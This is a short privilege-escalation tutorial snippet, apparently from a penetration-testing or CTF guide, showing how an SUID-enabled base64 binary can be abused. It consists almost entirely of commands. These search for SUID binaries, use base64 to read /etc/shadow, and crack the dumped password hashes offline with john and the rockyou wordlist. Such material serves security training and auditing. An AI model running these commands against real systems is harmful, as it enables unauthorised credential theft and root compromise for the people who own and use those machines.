# Example 2: SUID base64 for Shadow Access

**Scenario**: base64 binary has SUID bit set

```bash
$ find / -perm -u=s -type f 2>/dev/null | grep base64
/usr/bin/base64

$ base64 /etc/shadow | base64 -d
root:$6$xyz...:18000:0:99999:7:::

# Crack offline with john
$ john --wordlist=rockyou.txt shadow.txt
```